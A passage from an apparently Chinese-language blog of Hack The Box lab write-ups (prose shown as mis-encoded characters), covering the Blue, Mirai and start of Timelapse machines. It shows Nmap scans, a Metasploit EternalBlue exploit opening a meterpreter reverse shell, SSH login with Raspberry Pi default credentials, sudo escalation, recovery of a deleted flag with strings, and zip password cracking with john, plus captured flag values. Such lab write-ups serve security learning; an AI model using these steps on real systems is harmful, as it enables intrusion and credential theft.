\n|   date: 2022-03-30T04:26:34\n|_  start_date: 2022-03-30T04:03:04\n\nTRACEROUTE (using port 995/tcp)\nHOP RTT       ADDRESS\n1   552.18 ms 10.10.16.1\n2   255.14 ms 10.10.10.40\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 238.83 seconds\n```\nè¿™å°å¾ˆæ˜æ˜¾äº†ï¼Œè€Œä¸”ç›¸ä¿¡å¤§å®¶çœ‹åå­—å°±å·²ç»å¾ˆæ˜ç¡®äº†ï¼Œæˆ‘å°±ä¸å¤šè¯´äº†ï¼Œç›´æ¥åˆ©ç”¨å§\n\n## æ°¸æ’ä¹‹è“\n### Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap --script=vuln 10.10.10.40                      \nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-30 00:29 EDT\nNmap scan report for 10.10.10.40\nHost is up (0.54s latency).\nNot shown: 991 closed ports\nPORT      STATE SERVICE\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n49152/tcp open  unknown\n49153/tcp open  unknown\n49154/tcp open  unknown\n49155/tcp open  unknown\n49156/tcp open  unknown\n49157/tcp open  unknown\n\nHost script results:\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND\n| smb-vuln-ms17-010: \n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|           \n|     Disclosure date: 2017-03-14\n|     References:\n|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\n|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n\nNmap done: 1 IP address (1 host up) scanned in 173.70 seconds\n```\nç¡®è®¤å­˜åœ¨\n\n### Metasploit\n```bash\nuse auxiliary/scanner/smb/smb_ms17_010\n\nmsf6 auxiliary(scanner/smb/smb_ms17_010) > show options \n\nModule options (auxiliary/scanner/smb/smb_ms17_010):\n\n   Name         Current Setting                                                 Required  Description\n   ----         ---------------                                                 --------  -----------\n   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts\n   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts\n   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts\n   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check\n   RHOSTS       10.10.10.40                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT        445                                                             yes       The SMB service port (TCP)\n   SMBDomain    .                                                               no        The Windows domain to use for authentication\n   SMBPass                                                                      no        The password for the specified username\n   SMBUser                                                                      no        The username to authenticate as\n   THREADS      1                                                               yes       The number of concurrent threads (max one per host)\n```\n```bash\nmsf6 auxiliary(scanner/smb/smb_ms17_010) > exploit \n\n[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)\n[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\nç¡®è®¤å­˜åœ¨\n\n# æ¼æ´åˆ©ç”¨\n## Metasploit\n```bash\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > show options \n\nModule options (exploit/windows/smb/ms17_010_eternalblue):\n\n   Name           Current Setting  Required  Description\n   ----           ---------------  --------  -----------\n   RHOSTS         10.10.10.40      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT          445              yes       The target port (TCP)\n   SMBDomain      .                no        (Optional) The Windows domain to use for authentication\n   SMBPass                         no        (Optional) The password for the specified username\n   SMBUser                         no        (Optional) The username to authenticate as\n   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.\n   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.16.4       yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows 7 and Server 2008 R2 (x64) All Service Packs\n```\n```bash\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.4:4444 \n[*] 10.10.10.40:445 - Executing automatic check (disable AutoCheck to override)\n[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check\n[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)\n[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)\n[+] 10.10.10.40:445 - The target is vulnerable.\n[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check\n[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)\n[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)\n[*] 10.10.10.40:445 - Connecting to target for exploitation.\n[+] 10.10.10.40:445 - Connection established for exploitation.\n[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply\n[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)\n[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes\n[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv\n[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      \n[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply\n[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.\n[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet\n[*] 10.10.10.40:445 - Starting non-paged pool grooming\n[+] 10.10.10.40:445 - Sending SMBv2 buffers\n[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.\n[*] 10.10.10.40:445 - Sending final SMBv2 buffers.\n[*] 10.10.10.40:445 - Sending last fragment of exploit packet!\n[*] 10.10.10.40:445 - Receiving response from exploit packet\n[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!\n[*] 10.10.10.40:445 - Sending egg to corrupted connection.\n[*] 10.10.10.40:445 - Triggering free of corrupted buffer.\n[*] Sending stage (200262 bytes) to 10.10.10.40\n[*] Meterpreter session 1 opened (10.10.16.4:4444 -> 10.10.10.40:49158) at 2022-03-30 00:34:57 -0400\n[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n```\nåˆ©ç”¨æˆåŠŸ\n\n```bash\nmeterpreter > search -f user.txt\nFound 1 result...\n    c:\\Users\\haris\\Desktop\\user.txt (34 bytes)\nmeterpreter > search -f root.txt\nFound 1 result...\n    c:\\Users\\Administrator\\Desktop\\root.txt (34 bytes)\nmeterpreter > cat 'c:\\Users\\haris\\Desktop\\user.txt'\ncf2da488a16cd6551e8813a3f3b2ad0a\nmeterpreter > cat 'c:\\Users\\Administrator\\Desktop\\root.txt'\n36bf758af3a68b38f132c2e4b2bc4531\n```\næˆåŠŸæ‹¿åˆ° user æƒé™å’Œ root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Mirai - Hackthebox","url":"/2022/04/02/Hackthebox/Easy/Hackthebox-Mirai/","content":"\n# Hackthebox - Mirai\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Mirai/84a4d86d-4be3-4692-910f-9c3478f2e95f.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Mirai/fdb4e52f-9bb3-4032-ab06-2951b7c36f47.png)\n\n# ä¿¡æ¯æœé›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Mirai]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.48\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-30 00:47 EDT\nNmap scan report for 10.10.10.48\nHost is up (7.9s latency).\nNot shown: 63987 filtered ports, 1545 closed ports\nPORT   STATE SERVICE    VERSION\n22/tcp open  tcpwrapped\n| ssh-hostkey: \n|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)\n|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)\n|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)\n|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)\n53/tcp open  tcpwrapped\n| dns-nsid: \n|_  bind.version: dnsmasq-2.76\n80/tcp open  tcpwrapped\n|_http-server-header: lighttpd/1.4.35\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\nDevice type: firewall\nRunning (JUST GUESSING): Fortinet embedded (87%)\nOS CPE: cpe:/h:fortinet:fortigate_100d\nAggressive OS guesses: Fortinet FortiGate 100D firewall (87%)\nNo exact OS matches for host (test conditions non-ideal).\n\nTRACEROUTE (using port 587/tcp)\nHOP RTT    ADDRESS\n1   ... 30\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 226.95 seconds\n```\n## Http\n![](Hackthebox-Mirai/01666f8d-186c-423f-9cc1-6e32bf5eb6ca.png)\n\nç›´æ¥è®¿é—®å‘ç°æ‰¾ä¸åˆ°ç½‘é¡µï¼Œè”æƒ³åˆ°æœ‰ 53 ç«¯å£ï¼Œåšä¸€ä¸ªæœ¬åœ° DNS è§£æã€‚\n\n```bash\necho 10.10.10.48 mirai.htb >> /etc/hosts\n```\nç„¶åå»è®¿é—® mirai.htb\n\n![](Hackthebox-Mirai/f052fc73-65c0-48b6-b7e6-5904024146b6.png)\n\nè¯¥ç½‘ç«™ä¼¼ä¹å¼€å¯äº†ç™½åå•éªŒè¯æœºåˆ¶ï¼Œå’±ä»¬æŠ“ä¸ªåŒ…çœ‹çœ‹\n\n![](Hackthebox-Mirai/67052bdd-27a8-4c3d-ac3e-88a87eed2977.png)\n\nä¹Ÿæ²¡çœ‹åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œå»çœ‹çœ‹æ˜¯å¦æœ‰å¯åˆ©ç”¨çš„æ¼æ´å§\n\n## Fuzz\nå» fuzz ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰å¯ç”¨çš„æ–‡ä»¶\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://mirai.htb/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -fw 400  \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://mirai.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response words: 400\n________________________________________________\n\nadmin                   [Status: 301, Size: 0, Words: 1, Lines: 1]\n```\næœ‰ä¸€ä¸ª admin ç›®å½•ï¼Œè®¿é—®ä¸€ä¸‹\n\n![](Hackthebox-Mirai/509a43fc-f3a6-4bef-80d1-6e5c896997d9.png)\n\nä¼¼ä¹æ˜¯ä¸€ä¸ªæ ‘è“æ´¾çš„ç•Œé¢ï¼Œå»ç™»å½•è¯•è¯•\n\n![](Hackthebox-Mirai/43160462-2131-48d3-ab7f-19e16c18f846.png)\n\nç™»å½•å¤±è´¥ï¼Œç»è¿‡æœç´¢åå‘ç°ï¼Œæ ‘è“æ´¾æ˜¯æ²¡æœ‰é»˜è®¤å¯†ç çš„ï¼Œå…¨æ˜¯éšæœºå¯†ç \n\nä½†åŒæ—¶ä¹ŸçŸ¥é“äº†æ ‘è“æ´¾çš„é»˜è®¤ ssh å¯†ç \n\n```bash\nusername = pi\npassword = raspberry\n```\nå»ç™»å½•ä¸€ä¸‹\n\n# æ¼æ´åˆ©ç”¨\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ssh pi@10.10.10.48                \nThe authenticity of host '10.10.10.48 (10.10.10.48)' can't be established.\nECDSA key fingerprint is SHA256:UkDz3Z1kWt2O5g2GRlullQ3UY/cVIx/oXtiqLPXiXMY.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.48' (ECDSA) to the list of known hosts.\npi@10.10.10.48's password: \n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sun Aug 27 14:47:50 2017 from localhost\n\nSSH is enabled and the default password for the 'pi' user has not been changed.\nThis is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.\n\nSSH is enabled and the default password for the 'pi' user has not been changed.\nThis is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.\n\npi@raspberrypi:~ $ whoami&&id\npi\nuid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),117(i2c),998(gpio),999(spi)\n```\næˆåŠŸè·å¾—ä¸€ä¸ª user æƒé™\n\n```bash\npi@raspberrypi:~/Desktop $ cat user.txt \nff837707441b257a20e32199d7c8838d\n```\næˆåŠŸè·å¾— user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\n```bash\npi@raspberrypi:~/Desktop $ sudo -l\nMatching Defaults entries for pi on localhost:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser pi may run the following commands on localhost:\n    (ALL : ALL) ALL\n    (ALL) NOPASSWD: ALL\n```\nä½¿ç”¨ sudo -l æŸ¥çœ‹ä¸€ä¸‹å½“å‰ sudo æƒé™ï¼Œå‘ç°æ‹¥æœ‰æ‰€æœ‰æƒé™ï¼Œé‚£ç›´æ¥ææƒå§\n\n```bash\npi@raspberrypi:~/Desktop $ sudo su\nroot@raspberrypi:/home/pi/Desktop# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\næˆåŠŸè·å¾— root æƒé™\n\n```bash\nroot@raspberrypi:~# cat root.txt \nI lost my original root.txt! I think I may have a backup on my USB stick...\n```\næˆåŠŸè·ã€‚ã€‚ã€‚å—¯ï¼Ÿä¸å¤ªå¯¹ï¼Œroot æƒé™çš„ flag æ–‡ä»¶ä¸¢å¤±ï¼Œä½†æ˜¯æç¤ºå¯èƒ½åœ¨ U ç›˜é‡Œæœ‰å¤‡ä»½\n\n```bash\nroot@raspberrypi:/# mount\nsysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)\nproc on /proc type proc (rw,nosuid,nodev,noexec,relatime)\ntmpfs on /run type tmpfs (rw,nosuid,relatime,size=102396k,mode=755)\n/dev/sda1 on /lib/live/mount/persistence/sda1 type iso9660 (ro,noatime)\n/dev/loop0 on /lib/live/mount/rootfs/filesystem.squashfs type squashfs (ro,noatime)\ntmpfs on /lib/live/mount/overlay type tmpfs (rw,relatime)\n/dev/sda2 on /lib/live/mount/persistence/sda2 type ext4 (rw,noatime,data=ordered)\naufs on / type aufs (rw,noatime,si=795e312f,noxino)\ndevtmpfs on /dev type devtmpfs (rw,nosuid,size=10240k,nr_inodes=58955,mode=755)\nsecurityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)\ntmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)\ndevpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)\ntmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)\ntmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)\ncgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/lib/systemd/systemd-cgroups-agent,name=systemd)\npstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)\ncgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)\ncgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)\ncgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)\ncgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)\ncgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)\ncgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)\ncgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)\nsystemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=22,pgrp=1,timeout=300,minproto=5,maxproto=5,direct)\nhugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime)\nmqueue on /dev/mqueue type mqueue (rw,relatime)\ndebugfs on /sys/kernel/debug type debugfs (rw,relatime)\ntmpfs on /tmp type tmpfs (rw,nosuid,nodev,relatime)\n/dev/sdb on /media/usbstick type ext4 (ro,nosuid,nodev,noexec,relatime,data=ordered)\ntmpfs on /run/user/999 type tmpfs (rw,nosuid,nodev,relatime,size=51200k,mode=700,uid=999,gid=997)\ntmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=51200k,mode=700,uid=1000,gid=1000)\n```\nä½¿ç”¨ mount æŸ¥çœ‹ä¸€ä¸‹æŒ‚è½½äº†å“ªäº›å¤–éƒ¨é©±åŠ¨å™¨\n\næˆ‘ä»¬æŠŠçœ¼å…‰æ”¾åœ¨å€’æ•°ç¬¬ä¸‰è¡Œä¸Š\n\n```bash\n/dev/sdb on /media/usbstick type ext4 (ro,nosuid,nodev,noexec,relatime,data=ordered)\n```\n/media/usbstick åº”è¯¥å°±æ˜¯äº†ï¼Œå»çœ‹çœ‹\n\n```bash\nroot@raspberrypi:/# cd /media/usbstick\nroot@raspberrypi:/media/usbstick# ls -la\ntotal 18\ndrwxr-xr-x 3 root root  1024 Aug 14  2017 .\ndrwxr-xr-x 3 root root  4096 Aug 14  2017 ..\n-rw-r--r-- 1 root root   129 Aug 14  2017 damnit.txt\ndrwx------ 2 root root 12288 Aug 14  2017 lost+found\n```\nè¿™é‡Œæœ‰ä¸€ä¸ª damnit.txt æ–‡ä»¶ï¼ŒæŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nroot@raspberrypi:/media/usbstick# cat damnit.txt \nDamnit! Sorry man I accidentally deleted your files off the USB stick.\nDo you know if there is any way to get them back?\n\n-James\n```\nè¿™åˆæ˜¯å˜›ç©æ„å„¿\n\nJames ä¸å°å¿ƒæŠŠæˆ‘ä»¬ U ç›˜çš„æ–‡ä»¶ç»™åˆ äº†ï¼Ÿä½ æè¿™è·Ÿæˆ‘å¥—å¨ƒå‘¢ï¼Ÿ\n\næˆ‘ä»¬åº”è¯¥æ˜¯åœ¨ /dev/sdb åˆ†åŒºä¸Šï¼Œä½¿ç”¨ strings å‘½ä»¤åˆ—å‡ºä»¥å‰åœ¨ /dev/sdb åˆ†åŒºä¸Šæ‰§è¡Œè¿‡çš„å‘½ä»¤\n\n```bash\nroot@raspberrypi:/media/usbstick# strings /dev/sdb\n>r &\n/media/usbstick\nlost+found\nroot.txt\ndamnit.txt\n>r &\n>r &\n/media/usbstick\nlost+found\nroot.txt\ndamnit.txt\n>r &\n/media/usbstick\n2]8^\nlost+found\nroot.txt\ndamnit.txt\n>r &\n3d3e483143ff12ec505d026fa13e020b\nDamnit! Sorry man I accidentally deleted your files off the USB stick.\nDo you know if there is any way to get them back?\n-James\n```\nè¡Œå§ï¼Œä»¥å‰æŸ¥çœ‹è¿‡æˆ‘ä»¬çš„ flag æ–‡ä»¶ï¼Œä¹Ÿç®—æ˜¯æ‹¿åˆ°äº† root æƒé™çš„ flag æ–‡ä»¶å§","tags":["Hackthebox"]},{"title":"Timelapse - Hackthebox","url":"/2022/04/01/Hackthebox/Easy/Hackthebox-Timelapse/","content":"\n# Hackthebox - Timelapse\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Timelapse/21d30a56-eb87-405e-a64a-7d06304b00b0.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Timelapse/d71ce49e-2d3d-42f1-aa45-a4feaaff6b38.png)\n\n# ä¿¡æ¯æœé›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.152\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-29 02:18 EDT\nNmap scan report for 10.10.11.152\nHost is up (0.55s latency).\nNot shown: 65525 filtered ports\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-29 14:19:01Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds?\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)\n5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n| ssl-cert: Subject: commonName=dc01.timelapse.htb\n| Not valid before: 2021-10-25T14:05:29\n|_Not valid after:  2022-10-25T14:25:29\n|_ssl-date: 2022-03-29T14:21:28+00:00; +7h59m58s from scanner time.\n| tls-alpn: \n|_  http/1.1\n9389/tcp  open  mc-nmf        .NET Message Framing\n49674/tcp open  msrpc         Microsoft Windows RPC\n51354/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nOS fingerprint not ideal because: Missing a closed TCP port so results incomplete\nNo OS matches for host\nNetwork Distance: 2 hops\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m57s\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2022-03-29T14:20:18\n|_  start_date: N/A\n\nTRACEROUTE (using port 135/tcp)\nHOP RTT       ADDRESS\n1   556.15 ms 10.10.16.1\n2   556.22 ms 10.10.11.152\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 196.57 seconds\n```\n## Smb\nè¿™å°æœºå™¨æ˜æ˜¾æœ‰ smbï¼Œå…ˆå»æ‰¾ä¸€ä¸‹ guest ç”¨æˆ·çš„ç¥¨æ®\n\n```bash\nenum4linux -a -u \"guset\" -p \"\" 10.10.11.152\n\n[+] Attempting to map shares on 10.10.11.152\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.\n//10.10.11.152/ADMIN$   Mapping: DENIED, Listing: N/A\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.\n//10.10.11.152/C$       Mapping: DENIED, Listing: N/A\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.\n//10.10.11.152/IPC$     [E] Can't understand response:\nNT_STATUS_INVALID_INFO_CLASS listing \\*\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.\n//10.10.11.152/NETLOGON Mapping: OK     Listing: DENIED\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.\n//10.10.11.152/Shares   Mapping: OK, Listing: OK\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.\n//10.10.11.152/SYSVOL   Mapping: OK     Listing: DENIED\n```\nè¯¥ Shares æ–‡ä»¶å¤¹å¯ä¾›é˜…è¯»ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹é‡Œé¢æœ‰äº›ä»€ä¹ˆ\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]\nâ””â”€# smbclient -U \"guest\" //10.10.11.152/Shares \nEnter WORKGROUP\\guest's password: \nTry \"help\" to get a list of possible commands.\nsmb: \\> dir\n  .                                   D        0  Mon Oct 25 11:39:15 2021\n  ..                                  D        0  Mon Oct 25 11:39:15 2021\n  Dev                                 D        0  Mon Oct 25 15:40:06 2021\n  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021\n\n                6367231 blocks of size 4096. 2323752 blocks available\n```\næœ‰ä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œå»æŒ¨ä¸ªæŸ¥è¯¢ä¸€ä¸‹\n\n```bash\nsmb: \\> cd Dev\nsmb: \\Dev\\> dir\n  .                                   D        0  Mon Oct 25 15:40:06 2021\n  ..                                  D        0  Mon Oct 25 15:40:06 2021\n  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021\n\n                6367231 blocks of size 4096. 2323752 blocks available\n```\nDev ç›®å½•ä¸‹æœ‰ä¸€ä¸ª winrm\\_backup.zip å‹ç¼©æ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥çœ‹çœ‹\n\n```bash\nsmb: \\Dev\\> get winrm_backup.zip \ngetting file \\Dev\\winrm_backup.zip of size 2611 as winrm_backup.zip (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec)\n```\n## John\nä¸‹è½½ä¸‹æ¥äº†ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]\nâ””â”€# unzip winrm_backup.zip \nArchive:  winrm_backup.zip\n[winrm_backup.zip] legacyy_dev_auth.pfx password:\n```\néœ€è¦è§£å‹å¯†ç ï¼Œå’±ä»¬æ²¡æœ‰å•Šï¼Œä½¿ç”¨ john å°è¯•çˆ†ç ´ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]\nâ””â”€# zip2john winrm_backup.zip > hash\nver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: 2b chk, TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]\nâ””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt hash    \nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nsupremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)\n1g 0:00:00:00 DONE (2022-03-29 21:46) 3.333g/s 11578Kp/s 11578Kc/s 11578KC/s surfroxy154..supergay01\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n```\nè§£å‹å¯†ç æ˜¯ supremelegacy å»è§£å‹ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]\nâ””â”€# unzip winrm_backup.zip \nArchive:  winrm_backup.zip\n[winrm_backup.zip] legacyy_dev_auth.pfx password: \n  inflating: legacyy_dev_auth.pfx\n```\n# æ¼æ´åˆ©ç”¨\nè§£å‹å‡ºæ¥åæœ‰ä¸€ä¸ª pfx æ–‡ä»¶ï¼ŒæŸ¥è¯¢äº†ä¸€ä¸‹ pfx å¯ä»¥ä½¿ç”¨ openssl æå–å‡ºç§é’¥ï¼Œå»æå–ä¸€ä¸‹\n\n> 